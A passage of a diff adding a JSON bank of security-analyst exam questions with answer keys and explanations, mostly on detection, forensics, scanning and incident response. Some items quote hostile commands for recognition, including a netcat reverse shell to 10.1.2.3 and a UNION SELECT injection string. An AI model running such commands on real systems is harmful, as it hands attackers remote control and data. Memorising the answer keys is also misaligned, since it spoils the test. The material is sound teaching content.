+   "options": [
+    "Run a vulnerability scan",
+    "Escalate privileges on the server",
+    "Install extra tools first",
+    "Patch the server"
+   ],
+   "answer": 1,
+   "why": "Higher privileges allow installing tools, reading credentials and reaching more of the network, which pivoting depends on."
+  },
+  {
+   "q": "An analyst diagrams the high-level functions a malware sample uses to reach its goals. What is this called?",
+   "options": [
+    "Static analysis",
+    "Dynamic analysis",
+    "Composition",
+    "Decomposition"
+   ],
+   "answer": 3,
+   "why": "Decomposition breaks malware down into its components and their purposes, often as part of reverse engineering."
+  },
+  {
+   "q": "A small regional business wants to know how likely port scans are against its DMZ. How should this be rated?",
+   "options": [
+    "Low",
+    "Medium",
+    "High",
+    "Not enough information"
+   ],
+   "answer": 2,
+   "why": "Automated scanning of every internet-facing address is constant, so scans of a DMZ are almost certain regardless of the organisation's size."
+  },
+  {
+   "q": "All log sources from one branch have stopped reporting to the SIEM for 24 hours. Which type of alert would have caught this sooner?",
+   "options": [
+    "A heuristic alert",
+    "An anomaly alert",
+    "A behaviour alert",
+    "An availability alert"
+   ],
+   "answer": 3,
+   "why": "Availability rules alert when a source goes silent or a system goes down, exactly the gap here."
+  },
+  {
+   "q": "An alert texts an administrator every 30 seconds whenever any of their 200 machines stops logging for a minute. What is the risk?",
+   "options": [
+    "Alert fatigue: administrators start ignoring or filtering alerts",
+    "A network outage",
+    "A memory spike",
+    "A DDoS against administrators"
+   ],
+   "answer": 0,
+   "why": "Too many alerts train people to ignore them, which is how real incidents get missed."
+  },
+  {
+   "q": "An alert fires when a user who never travels logs in from another country. What type of analysis is this?",
+   "options": [
+    "Availability analysis",
+    "Heuristic analysis",
+    "Behaviour analysis",
+    "Trend analysis"
+   ],
+   "answer": 2,
+   "why": "Behavioural analysis compares activity with each user's own normal pattern and flags deviations."
+  },
+  {
+   "q": "Examining malware files and binaries without running them is what kind of analysis?",
+   "options": [
+    "Automated analysis",
+    "Static analysis",
+    "Dynamic analysis",
+    "Heuristic analysis"
+   ],
+   "answer": 1,
+   "why": "Static analysis inspects code, strings and structure. Dynamic analysis runs the sample in a sandbox to watch its behaviour."
+  },
+  {
+   "q": "Management worries about data remanence when moving between virtual hosts at an IaaS provider. What should the team do?",
+   "options": [
+    "Zero-wipe the provider's drives",
+    "Spread data over several virtual disks",
+    "Use full-disk encryption",
+    "Use data masking"
+   ],
+   "answer": 2,
+   "why": "You can't wipe the provider's physical disks, but data that was always encrypted is unreadable if remnants are left behind."
+  },
+  {
+   "q": "Which technology stops one laptop from attacking another workstation on the same internal network?",
+   "options": [
+    "A host-based IPS",
+    "A network IPS at the border",
+    "A host-based IDS",
+    "A network IDS"
+   ],
+   "answer": 0,
+   "why": "Traffic between two internal hosts may never cross a network sensor, so protection has to sit on the host, and an IPS blocks where an IDS only alerts."
+  },
+  {
+   "q": "To drop all traffic to, from and through a Linux host with iptables, which chain policy is not needed?",
+   "options": [
+    "INPUT",
+    "FORWARD",
+    "OUTPUT",
+    "SERVICE"
+   ],
+   "answer": 3,
+   "why": "iptables' built-in filter chains are INPUT, OUTPUT and FORWARD. There is no SERVICE chain."
+  },
+  {
+   "q": "After moving ERP to a SaaS provider, how does the team most likely validate security instead of scanning it themselves?",
+   "options": [
+    "Rely on vendor testing and audits",
+    "Hire a third-party tester to attack the vendor",
+    "Scan through a VPN into the vendor's network",
+    "Use a different scanner"
+   ],
+   "answer": 0,
+   "why": "SaaS customers usually can't scan the provider without permission, so they depend on audit reports such as SOC 2 and the vendor's own testing."
+  },
+  {
+   "q": "A tool labels a host as a Hewlett-Packard device from a packet capture. What did it use?",
+   "options": [
+    "OS flags",
+    "The system's banner",
+    "The MAC address vendor prefix",
+    "The IP address"
+   ],
+   "answer": 2,
+   "why": "The first half of a MAC address is the manufacturer's OUI, which identifies the vendor of the network card."
+  },
+  {
+   "q": "Spam is arriving at exactly the addresses listed in the domain's registration records. What limits this?",
+   "options": [
+    "DNS query rate limiting",
+    "Using a privacy or proxy registration service",
+    "Blocklisting",
+    "CAPTCHAs"
+   ],
+   "answer": 1,
+   "why": "A privacy service replaces the contact details in WHOIS, so harvesters no longer get real addresses."
+  },
+  {
+   "q": "Which source shows what third-party scanners have already found exposed on your public IP addresses?",
+   "options": [
+    "The OpenVAS central repository",
+    "Shodan",
+    "A worldwide nmap database",
+    "The CVE database"
+   ],
+   "answer": 1,
+   "why": "Shodan continuously scans the internet and indexes banners and open services, so you can look up your own range."
+  },
+  {
+   "q": "Which is not something netcat can do on its own?",
+   "options": [
+    "Scan ports",
+    "Transfer files",
+    "Provide an encrypted shell",
+    "Open a reverse shell"
+   ],
+   "answer": 2,
+   "why": "Traditional netcat sends raw unencrypted data. Encrypted sessions need tools such as ncat with --ssl or socat."
+  },
+  {
+   "q": "Which tool can passively gather data to build a network topology map?",
+   "options": [
+    "Network Mapper scanners",
+    "Wireshark",
+    "Nessus",
+    "nmap"
+   ],
+   "answer": 1,
+   "why": "Wireshark only listens to traffic, so it builds a picture without sending probes. The others actively scan."
+  },
+  {
+   "q": "What is an advanced search-engine query used to find exposed information called?",
+   "options": [
+    "A SuperGoogle",
+    "A Google gizmo",
+    "A Google whack",
+    "A Google dork"
+   ],
+   "answer": 3,
+   "why": "Google dorks use operators such as site:, ext: and inurl: to find files and pages that shouldn't be public."
+  },
+  {
+   "q": "Which type of control review focuses heavily on change management?",
+   "options": [
+    "Technical control review",
+    "Responsive control review",
+    "Detective control review",
+    "Operational control review"
+   ],
+   "answer": 3,
+   "why": "Operational controls are the day-to-day processes people follow, and change management is a core one."
+  },
+  {
+   "q": "What is the best way to check regularly that a file hasn't changed?",
+   "options": [
+    "Use a file integrity tool such as Tripwire",
+    "Encrypt the file",
+    "Write a script that compares a SHA-1 hash",
+    "Check the file's timestamps"
+   ],
+   "answer": 0,
+   "why": "Integrity monitoring tools keep protected baselines of many files and alert on changes; timestamps can be faked."
+  },
+  {
+   "q": "Which tool automates gathering emails, subdomains and employee names about a target from public sources?",
+   "options": [
+    "theHarvester",
+    "nmap",
+    "Shodan",
+    "osint-ng"
+   ],
+   "answer": 0,
+   "why": "theHarvester queries search engines and public data sources to collect emails, hosts and names in one run."
+  },
+  {
+   "q": "A packet capture shows a long ESP session that can't be read. What is likely on the workstation?",
+   "options": [
+    "An encrypted RAT",
+    "A Base64 transfer tool",
+    "A VPN client",
+    "A secure web browser"
+   ],
+   "answer": 2,
+   "why": "ESP is IPsec's encrypted payload protocol, used by VPNs. Web browsers use TLS over TCP instead."
+  },
+  {
+   "q": "Which Linux tool quickly shows readable text inside a suspicious binary?",
+   "options": [
+    "more",
+    "grep",
+    "strings",
+    "less"
+   ],
+   "answer": 2,
+   "why": "strings prints sequences of printable characters, revealing URLs, file paths and messages hidden in the binary."
+  },
+  {
+   "q": "Malware added hosts-file entries mapping antivirus vendors' domains to 0.0.0.0. Why?",
+   "options": [
+    "To redirect 0.0.0.0 to those sites",
+    "To enable remote access",
+    "To keep other attackers out",
+    "To block antivirus updates"
+   ],
+   "answer": 3,
+   "why": "Pointing those names at 0.0.0.0 makes connections fail, so the security software can't download updates."
+  },
+  {
+   "q": "A user is running john with a wordlist against hash.txt. What are they doing?",
+   "options": [
+    "A pass-the-hash attack",
+    "Hashing a file",
+    "Cracking hashed passwords",
+    "Decrypting encrypted passwords"
+   ],
+   "answer": 2,
+   "why": "John the Ripper hashes each word and compares it with the stored hashes; the file contains hashes, not encrypted passwords."
+  },
+  {
+   "q": "What standard naming scheme does nmap use for detected hardware and software?",
+   "options": [
+    "CPE",
+    "CVSS",
+    "CWE",
+    "CVE"
+   ],
+   "answer": 0,
+   "why": "Common Platform Enumeration gives products standard names, such as cpe:/o:microsoft:windows_10."
+  },
+  {
+   "q": "A server fights a SYN flood by answering without keeping state, rebuilding the entry only when the client completes the handshake. What is this?",
+   "options": [
+    "ACK-ACK",
+    "SYN replay",
+    "TCP frogging",
+    "SYN cookies"
+   ],
+   "answer": 3,
+   "why": "SYN cookies encode connection details in the sequence number, so no queue space is used until the final ACK proves the client is real."
+  },
+  {
+   "q": "Which two NIST penetration testing phases are often repeated during a test?",
+   "options": [
+    "Discovery and attack",
+    "Discovery and reporting",
+    "Planning and attack",
+    "Planning and discovery"
+   ],
+   "answer": 0,
+   "why": "Each successful attack reveals new systems to discover, so testers loop between discovery and attack."
+  },
+  {
+   "q": "Network appliances expose unneeded telnet, FTP and web services. What is the best fix?",
+   "options": [
+    "Turn off the services",
+    "Put a network firewall in front",
+    "Enable host firewalls",
+    "Patch the services"
+   ],
+   "answer": 0,
+   "why": "Disabling a service that isn't needed removes the risk entirely; the other options leave it running."
+  },
+  {
+   "q": "Which tool reads metadata such as camera model and GPS from photos?",
+   "options": [
+    "stegdetect",
+    "ExifTool",
+    "strings",
+    "Wireshark"
+   ],
+   "answer": 1,
+   "why": "ExifTool reads and writes EXIF metadata, which can reveal location, device and author."
+  },
+  {
+   "q": "A scheduled task runs nc -nv 10.1.2.3 443 -e cmd.exe every Friday evening. What does it do?",
+   "options": [
+    "Dials a host over NetBIOS",
+    "Creates an HTTPS session",
+    "Opens a reverse shell to 10.1.2.3 over port 443",
+    "Creates a VPN connection"
+   ],
+   "answer": 2,
+   "why": "-e cmd.exe hands a command prompt to the remote host. Using outbound 443 gets past a firewall that allows all outbound traffic."
+  },
+  {
+   "q": "Many internal sites use self-signed certificates. What should be reported?",
+   "options": [
+    "Only their creator can revoke them",
+    "Nothing",
+    "Visitors will get certificate warnings",
+    "They don't encrypt traffic securely"
+   ],
+   "answer": 2,
+   "why": "Self-signed certificates encrypt fine, but browsers can't verify them, so users see warnings and learn to click past them."
+  },
+  {
+   "q": "Calling staff while posing as support for their new software to get configuration details is called what?",
+   "options": [
+    "Pretexting",
+    "Profiling",
+    "Tailgating",
+    "OSINT"
+   ],
+   "answer": 0,
+   "why": "Pretexting invents a believable scenario to get someone to share information."
+  },
+  {
+   "q": "Which data source helps a SIEM spot hosts sending unusual volumes of data out?",
+   "options": [
+    "A honeypot",
+    "NetFlow records",
+    "A BGP monitor",
+    "Firewall rules"
+   ],
+   "answer": 1,
+   "why": "Flow records show who talked to whom and how much, which reveals exfiltration."
+  },
+  {
+   "q": "During a test the tester suddenly can't reach the target network at all. What most likely happened?",
+   "options": [
+    "Automated shunning by the target's defences",
+    "A link failure",
+    "A back-off algorithm",
+    "A BGP change"
+   ],
+   "answer": 0,
+   "why": "An IPS that shuns blocks the source address of detected attacks."
+  },
+  {
+   "q": "A host has TCP 515, 631 and 9100 open, plus 22, 80 and 443. What is it most likely?",
+   "options": [
+    "A proxy",
+    "An FTP server",
+    "A printer",
+    "A web server"
+   ],
+   "answer": 2,
+   "why": "515 is LPD, 631 is IPP and 9100 is raw printing, all printer services."
+  },
+  {
+   "q": "Attackers copied a domain admin's volume shadow copy. What should not be reported as exposed?",
+   "options": [
+    "Domain details",
+    "Files on the desktop",
+    "Plain-text Windows passwords",
+    "Password hashes"
+   ],
+   "answer": 2,
+   "why": "Windows stores password hashes, not plain text, so hashes are exposed and may be cracked."
+  },
+  {
+   "q": "Which approach best helps an application survive a large DDoS?",
+   "options": [
+    "Use a content delivery network",
+    "Use aggressive firewall ageing",
+    "Shard the application",
+    "Optimise every query"
+   ],
+   "answer": 0,
+   "why": "A CDN spreads traffic across a huge distributed network so the origin isn't overwhelmed."
+  },
+  {
+   "q": "After an escalation, a server's vulnerabilities vanish from scans but SMB ports stay open. Most likely?",
+   "options": [
+    "The scanner was blocked",
+    "The server was patched",
+    "The plug-ins were updated",
+    "The system was offline"
+   ],
+   "answer": 1,
+   "why": "Open ports with no findings means the services still run but are no longer vulnerable."
+  },
+  {
+   "q": "How do you manually confirm a service on an unusual port is SMTP?",
+   "options": [
+    "ssh to the port",
+    "Send an email",
+    "Send an SMTP probe",
+    "telnet to the port and read the banner"
+   ],
+   "answer": 3,
+   "why": "Connecting with telnet or nc shows the greeting banner, such as 220 mail.example.com ESMTP."
+  },
+  {
+   "q": "A search for \"mysqli_connect\" ext:inc returns your site. What should you recommend?",
+   "options": [
+    "Start incident response",
+    "Change MySQL passwords and review the configuration",
+    "Block remote MySQL connections",
+    "Change the connection strings"
+   ],
+   "answer": 1,
+   "why": "Exposed include files may contain database credentials, so they must be changed right away."
+  },
+  {
+   "q": "Which certificate type gives the highest assurance about who owns a website?",
+   "options": [
+    "Extended Validation (EV)",
+    "Domain Validated (DV)",
+    "Organisation Validated (OV)",
+    "Individual Validated"
+   ],
+   "answer": 0,
+   "why": "EV requires the strictest checks of the legal entity before issue. DV only proves control of the domain."
+  },
+  {
+   "q": "A web log shows a GET request containing UNION SELECT username, password FROM users. What occurred?",
+   "options": [
+    "An unsuccessful query",
+    "A PHP overflow",
+    "A successful normal query",
+    "A SQL injection attempt"
+   ],
+   "answer": 3,
+   "why": "UNION SELECT appended to a parameter is a classic SQL injection pattern used to pull data from other tables."
+  },
+  {
+   "q": "What two pieces of information does nmap use to estimate network distance?",
+   "options": [
+    "IP address and TTL",
+    "OS and BGP flags",
+    "TTL and OS",
+    "TCP flags and IP"
+   ],
+   "answer": 0,
+   "why": "The returned TTL compared with the OS's usual starting value shows how many hops away a host is."
+  },
+  {
+   "q": "Which three items together identify most Americans uniquely?",
+   "options": [
+    "Zodiac sign, gender and ZIP code",
+    "Age, height and weight",
+    "Date of birth, gender and ZIP code",
+    "Height, weight and eye colour"
+   ],
+   "answer": 2,
+   "why": "Research found about 87% of US residents are unique on those three items."
+  },
+  {
+   "q": "What does nc -l -p 43501 < example.zip do?",
+   "options": [
+    "Runs a shell named example.zip",
+    "Receives example.zip",
+    "Opens a reverse shell",
+    "Listens on port 43501 and sends example.zip to whoever connects"
+   ],
+   "answer": 3,
+   "why": "-l listens, and input redirection feeds the file to the first client that connects."
+  },
+  {
+   "q": "Dozens of 'Failed password for root' lines from one IP in two seconds appear in auth.log. What is happening?",
+   "options": [
+    "A DoS on root",
+    "A brute-force attack on root",
+    "A misconfigured service",
+    "A forgotten password"
+   ],
+   "answer": 1,
+   "why": "Many rapid failures from one source against one account is automated password guessing."
+  },
+  {
+   "q": "A search for \"authentication failure; logname=\" ext:log on your domain returns results. What are they?",
+   "options": [
+    "Log names",
+    "Successful logins",
+    "Log file lists",
+    "Logs of failed logins"
+   ],
+   "answer": 3,
+   "why": "That string appears in Linux PAM failure messages, so public logs are exposing failed login attempts."
+  },
+  {
+   "q": "One host sends mail to alphabetical usernames, aaron@, abbott@, abel@ and so on. What reconnaissance is this?",
+   "options": [
+    "List building",
+    "Brute force",
+    "Domain harvesting",
+    "Domain probing"
+   ],
+   "answer": 2,
+   "why": "Sending to guessed names and watching bounces shows which addresses exist."
+  },
+  {
+   "q": "Which is not a typical SIEM capability?",
+   "options": [
+    "Performance management",
+    "Alerting",
+    "Data aggregation",
+    "Log retention"
+   ],
+   "answer": 0,
+   "why": "SIEMs collect, correlate, retain and alert on security events; performance monitoring is a different tool's job."
+  },
+  {
+   "q": "What is the main weakness of identifying malware by file hash?",
+   "options": [
+    "It needs unencrypted samples",
+    "It can't identify new or changed malware",
+    "Collisions cause false positives",
+    "Hashes can be spoofed"
+   ],
+   "answer": 1,
+   "why": "Any change to the file changes the hash, so modified or new malware won't match."
+  },
+  {
+   "q": "How can an analyst find which public IP range an organisation uses?",
+   "options": [
+    "Traceroute to the domain to find its network",
+    "Query DNS for every host",
+    "Ask ICANN",
+    "Scan the web server's whole subnet"
+   ],
+   "answer": 0,
+   "why": "Traceroute and registry lookups show the network block the organisation's hosts sit in."
+  },
+  {
+   "q": "A scan of the data centre from inside the firewall finds more open ports than one from outside. Why?",
+   "options": [
+    "Internal scans are faster",
+    "The scans are random",
+    "Outside scans never work",
+    "The firewall filters ports from the outside"
+   ],
+   "answer": 3,
+   "why": "Perimeter firewalls block most ports from the internet while internal hosts can reach more services."
+  },
+  {
+   "q": "Where should one scanner go for the most visibility across the whole network?",
+   "options": [
+    "Inside the core data centre network",
+    "Outside the firewall",
+    "On a remote laptop",
+    "At a branch office"
+   ],
+   "answer": 0,
+   "why": "A central position reaches the most systems; outside the perimeter it sees only what the firewall allows."
+  },
+  {
+   "q": "Where should a rule go to stop outsiders mapping the internal topology?",
+   "options": [
+    "On a Windows server",
+    "On the perimeter firewall",
+    "On the internal router",
+    "On a distribution switch"
+   ],
+   "answer": 1,
+   "why": "Blocking traceroute-style and ICMP traffic at the perimeter keeps internal structure hidden from the internet."
+  },
+  {
+   "q": "A caller posing as an executive's assistant gets an admin to send sales data. What type of social engineering?",
+   "options": [
+    "Whaling",
+    "Quid pro quo",
+    "Pretexting",
+    "Baiting"
+   ],
+   "answer": 2,
+   "why": "The caller invented a role and an urgent reason. Whaling would target the executive directly."
+  },
+  {
+   "q": "Hashing and tools like Tripwire mainly protect which security goal?",
+   "options": [
+    "Integrity",
+    "Availability",
+    "Identification",
+    "Confidentiality"
+   ],
+   "answer": 0,
+   "why": "Comparing hashes shows whether data has changed, which is integrity."
+  },
+  {
+   "q": "A 1 Gbps flow collector sits on a link now running near 2 Gbps. With no budget, what can be done?",
+   "options": [
+    "Sample the flows",
+    "Drop half the traffic",
+    "Disable logging",
+    "Use a second router"
+   ],
+   "answer": 0,
+   "why": "Sampled NetFlow records one packet in N, which keeps useful statistics within the collector's capacity."
+  },
+  {
+   "q": "A vulnerability scan fails on many hosts because of a host firewall. What is the best solution?",
+   "options": [
+    "Scan from the internet",
+    "Ignore those hosts",
+    "Run an agent-based or credentialed scan",
+    "Disable the firewall"
+   ],
+   "answer": 2,
+   "why": "Agents and credentialed scans check the system from inside, giving accurate results despite filtering."
+  },
+  {
+   "q": "Which CVSS metric describes whether an attack needs the attacker to be on the local network?",
+   "options": [
+    "Privileges required",
+    "Attack vector",
+    "Attack complexity",
+    "User interaction"
+   ],
+   "answer": 1,
+   "why": "Attack vector ranges from Network (remote) through Adjacent and Local to Physical."
+  },
+  {
+   "q": "What is the first step in the NIST incident response life cycle?",
+   "options": [
+    "Detection and analysis",
+    "Post-incident activity",
+    "Containment",
+    "Preparation"
+   ],
+   "answer": 3,
+   "why": "NIST SP 800-61 lists preparation; detection and analysis; containment, eradication and recovery; and post-incident activity."
+  },
+  {
+   "q": "During an incident, why take a forensic image before removing malware?",
+   "options": [
+    "To preserve evidence before it changes",
+    "To install patches",
+    "To speed up removal",
+    "To free disk space"
+   ],
+   "answer": 0,
+   "why": "Cleaning a system alters it. An image keeps an unaltered copy for analysis and possible legal use."
+  },
+  {
+   "q": "Which order should volatile evidence be collected in?",
+   "options": [
+    "Logs first, then RAM",
+    "Backups first",
+    "CPU registers and cache, RAM, then disk",
+    "Disk, RAM, then cache"
+   ],
+   "answer": 2,
+   "why": "Collect the most volatile data first because it disappears fastest; a disk survives power-off but RAM doesn't."
+  },
+  {
+   "q": "Which tool is commonly used to create a bit-for-bit disk image on Linux?",
+   "options": [
+    "dd",
+    "cp",
+    "rsync",
+    "tar"
+   ],
+   "answer": 0,
+   "why": "dd copies raw blocks, including deleted data and slack space, which file-level copies miss."
+  },
+  {
+   "q": "Why use a write blocker when imaging a suspect drive?",
+   "options": [
+    "To encrypt the image",
+    "To compress the image",
+    "To stop any changes to the original evidence",
+    "To speed up imaging"
+   ],
+   "answer": 2,
+   "why": "A write blocker allows reads but blocks writes, so the original stays exactly as found."
+  },
+  {
+   "q": "Why hash a drive image right after creating it?",
+   "options": [
+    "To compress it",
+    "To prove later that the image hasn't changed",
+    "To find malware",
+    "To encrypt it"
+   ],
+   "answer": 1,
+   "why": "Recomputing the hash later and matching it proves integrity, which supports the chain of custody."
+  },
+  {
+   "q": "Which type of containment cuts a compromised host off from the network but leaves it running?",
+   "options": [
+    "Removal",
+    "Segmentation",
+    "Reimaging",
+    "Isolation"
+   ],
+   "answer": 3,
+   "why": "Isolating keeps memory and processes intact for analysis while stopping the attacker reaching other systems."
+  },
+  {
+   "q": "What is the main goal of a lessons-learned meeting after an incident?",
+   "options": [
+    "Assign blame",
+    "Improve processes so similar incidents are handled better",
+    "Close the ticket",
+    "Restore backups"
+   ],
+   "answer": 1,
+   "why": "Post-incident review finds what worked and what didn't and feeds improvements back into preparation."
+  },
+  {
+   "q": "Which framework describes adversary tactics and techniques in a matrix used by analysts?",
+   "options": [
+    "ISO 27001",
+    "MITRE ATT&CK",
+    "PCI DSS",
+    "OWASP Top 10"
+   ],
+   "answer": 1,
+   "why": "ATT&CK catalogues real-world tactics and techniques, helping analysts map detections and gaps."
+  },
+  {
+   "q": "What does the Diamond Model of intrusion analysis relate?",
+   "options": [
+    "Plan, do, check and act",
+    "Adversary, capability, infrastructure and victim",
+    "People, process, technology and data",
+    "Confidentiality, integrity, availability and safety"
+   ],
+   "answer": 1,
+   "why": "Each intrusion event links those four features, helping analysts pivot between related activity."
+  },
+  {
+   "q": "In the Cyber Kill Chain, which stage comes right after delivery?",
+   "options": [
+    "Weaponisation",
+    "Reconnaissance",
+    "Exploitation",
+    "Installation"
+   ],
+   "answer": 2,
+   "why": "The stages are reconnaissance, weaponisation, delivery, exploitation, installation, command and control, and actions on objectives."
+  },
+  {
+   "q": "What is threat hunting?",
+   "options": [
+    "Running weekly vulnerability scans",
+    "Waiting for SIEM alerts",
+    "Proactively searching for threats that evaded existing defences",
+    "Penetration testing"
+   ],
+   "answer": 2,
+   "why": "Hunters form hypotheses and search data for signs of compromise rather than relying on automated alerts."
+  },
+  {
+   "q": "Which feed format and transport are used to share threat intelligence in a structured way?",
+   "options": [
+    "STIX and TAXII",
+    "XML and FTP",
+    "SNMP and syslog",
+    "JSON and SMTP"
+   ],
+   "answer": 0,
+   "why": "STIX describes threat information and TAXII is the protocol for exchanging it between organisations."
+  },
+  {
+   "q": "What is an indicator of compromise?",
+   "options": [
+    "A vulnerability score",
+    "A firewall rule",
+    "A security policy",
+    "Evidence such as a hash, IP or domain that suggests a system was breached"
+   ],
+   "answer": 3,
+   "why": "IOCs are artefacts left by attacks, used to search other systems for the same activity."
+  },
+  {
+   "q": "Why should a vulnerability scan be repeated after patching?",
+   "options": [
+    "To reset the scanner",
+    "To meet a timing rule",
+    "To confirm the fix worked",
+    "To find new users"
+   ],
+   "answer": 2,
+   "why": "Rescanning verifies remediation; patches sometimes fail or need a reboot to take effect."
+  },
+  {
+   "q": "A scanner reports a flaw that turns out not to exist. What is that?",
+   "options": [
+    "A false negative",
+    "A false positive",
+    "A true negative",
+    "A true positive"
+   ],
+   "answer": 1,
+   "why": "A false positive is a reported issue that isn't real. A false negative is a real issue the scanner missed."
+  },
+  {
+   "q": "Which scan type gives the most accurate results about installed software and patches?",
+   "options": [
+    "A credentialed scan",
+    "A passive scan",
+    "A ping sweep",
+    "An uncredentialed scan"
+   ],
+   "answer": 0,
+   "why": "Logging in lets the scanner read installed packages and settings directly instead of guessing from the network."
+  },
+  {
+   "q": "What is a compensating control?",
+   "options": [
+    "A control that pays for losses",
+    "An alternative control used when the normal one isn't possible",
+    "An audit finding",
+    "A backup control that never runs"
+   ],
+   "answer": 1,
+   "why": "If a legacy system can't be patched, isolating it can compensate by reducing the same risk another way."
+  },
+  {
+   "q": "Why might a vulnerability be accepted rather than fixed?",
+   "options": [
+    "It's on an internet-facing server",
+    "It has a high CVSS score",
+    "Fixing it costs more than the risk it poses",
+    "It was found recently"
+   ],
+   "answer": 2,
+   "why": "Risk acceptance is a documented business decision when remediation would cost more than the expected loss."
+  },
+  {
+   "q": "What does SOAR add to a SIEM?",
+   "options": [
+    "Longer log retention",
+    "Vulnerability scanning",
+    "Packet capture",
+    "Automated playbooks that respond to alerts"
+   ],
+   "answer": 3,
+   "why": "Security orchestration, automation and response runs playbooks, such as isolating hosts or blocking IPs, without manual steps."
+  },
+  {
+   "q": "What is the purpose of a sandbox in malware analysis?",
+   "options": [
+    "To run samples safely and watch their behaviour",
+    "To scan the network",
+    "To patch systems",
+    "To store samples"
+   ],
+   "answer": 0,
+   "why": "A sandbox is an isolated environment where malware can run without harming real systems while its actions are recorded."
+  },
+  {
+   "q": "Which log would show a user's successful and failed logons on a Windows server?",
+   "options": [
+    "The System log",
+    "The Application log",
+    "The Security event log",
+    "The Setup log"
+   ],
+   "answer": 2,
+   "why": "Logon events such as 4624 (success) and 4625 (failure) are written to the Security log."
+  },
+  {
+   "q": "What does beaconing in network traffic suggest?",
+   "options": [
+    "Malware regularly calling back to a command server",
+    "DNS caching",
+    "A user streaming video",
+    "A normal backup job"
+   ],
+   "answer": 0,
+   "why": "Connections at steady intervals to the same external host are a hallmark of command-and-control check-ins."
+  },
+  {
+   "q": "What is DNS tunnelling?",
+   "options": [
+    "Load-balancing DNS",
+    "Encrypting DNS with DoH",
+    "Caching DNS records",
+    "Hiding data inside DNS queries and responses to bypass controls"
+   ],
+   "answer": 3,
+   "why": "Attackers encode data in subdomain names and replies, since DNS is usually allowed out of networks."
+  },
+  {
+   "q": "Why are unusually long or random-looking subdomain queries suspicious?",
+   "options": [
+    "They mean caching is broken",
+    "They may be DNS tunnelling or algorithm-generated domains",
+    "They speed up DNS",
+    "They are always typos"
+   ],
+   "answer": 1,
+   "why": "Encoded data and domain generation algorithms produce long, random strings that normal browsing doesn't."
+  },
+  {
+   "q": "What does EDR provide that traditional antivirus doesn't?",
+   "options": [
+    "Continuous recording of endpoint activity for detection and investigation",
+    "Email filtering",
+    "Only signature updates",
+    "Firewall rules"
+   ],
+   "answer": 0,
+   "why": "Endpoint detection and response records process, file and network events so analysts can detect and investigate attacks."
+  },
+  {
+   "q": "Which attack moves through a network using captured password hashes instead of passwords?",
+   "options": [
+    "Rainbow tables",
+    "Credential stuffing",
+    "Pass-the-hash",
+    "Password spraying"
+   ],
+   "answer": 2,
+   "why": "Windows authentication can accept the NTLM hash directly, so a stolen hash works like the password."
+  },
+  {
+   "q": "Which practice best limits damage from a compromised administrator account?",
+   "options": [
+    "Sharing admin accounts",
+    "Separate admin accounts used only for admin tasks",
+    "Disabling logging",
+    "A longer password only"
+   ],
+   "answer": 1,
+   "why": "Daily work on a normal account means a phishing click doesn't hand over admin rights."
+  },
+  {
+   "q": "Which control best prevents unknown executables from running on servers?",
+   "options": [
+    "Antivirus signatures",
+    "Application allow-listing",
+    "A host firewall",
+    "Disk encryption"
+   ],
+   "answer": 1,
+   "why": "Allow-listing permits only approved programs, so new malware is blocked even without a signature."
+  },
+  {
+   "q": "What does a SIEM correlation rule do?",
+   "options": [
+    "Compresses logs",
+    "Links related events from different sources to detect an attack pattern",
+    "Sends logs to backup",
+    "Deletes duplicate logs"
+   ],
+   "answer": 1,
+   "why": "Correlation spots patterns no single log shows, such as many failed logins followed by a success and a new admin user."
+  },
+  {
+   "q": "Which metric tracks how long it takes to detect an incident?",
+   "options": [
+    "Recovery point objective",
+    "Mean time to repair",
+    "Mean time between failures",
+    "Mean time to detect (MTTD)"
+   ],
+   "answer": 3,
+   "why": "MTTD measures the gap between compromise and discovery; shorter means less time for an attacker."
+  },
+  {
+   "q": "Why is time synchronisation important for log analysis?",
+   "options": [
+    "So events from different systems can be put in the right order",
+    "To speed up logging",
+    "To encrypt logs",
+    "To reduce log size"
+   ],
+   "answer": 0,
+   "why": "Without a common time source, correlating events across systems is unreliable."
+  },
+  {
+   "q": "What is the main purpose of data classification?",
+   "options": [
+    "To speed up backups",
+    "To compress data",
+    "To delete old data",
+    "To decide how much protection each type of data needs"
+   ],
+   "answer": 3,
+   "why": "Labels such as public, internal and confidential drive handling, access and encryption rules."
+  },
+  {
+   "q": "Which regulation governs the protection of US health information?",
+   "options": [
+    "PCI DSS",
+    "HIPAA",
+    "GLBA",
+    "SOX"
+   ],
+   "answer": 1,
+   "why": "HIPAA covers protected health information. PCI DSS covers card data, GLBA financial data and SOX financial reporting."
+  },
+  {
+   "q": "What must a company do under PCI DSS?",
+   "options": [
+    "Store card numbers indefinitely",
+    "Encrypt all email",
+    "Publish breach reports monthly",
+    "Protect cardholder data and regularly test its security"
+   ],
+   "answer": 3,
+   "why": "PCI DSS requires controls such as encryption, access limits, logging, scanning and penetration testing for card data."
+  },
+  {
+   "q": "When should an incident be escalated to legal and management?",
+   "options": [
+    "Only after it's fully resolved",
+    "Only if the press asks",
+    "Never",
+    "When it involves regulated data or may require notification"
+   ],
+   "answer": 3,
+   "why": "Breaches of personal or regulated data can carry legal notification deadlines, so they must be escalated early."
+  },
+  {
+   "q": "What does a playbook give incident responders?",
+   "options": [
+    "A network diagram only",
+    "A list of software licences",
+    "Step-by-step actions for a specific type of incident",
+    "Marketing guidance"
+   ],
+   "answer": 2,
+   "why": "Playbooks make response consistent and fast, for example the exact steps for ransomware or a phishing report."
+  }
+ ]
+}
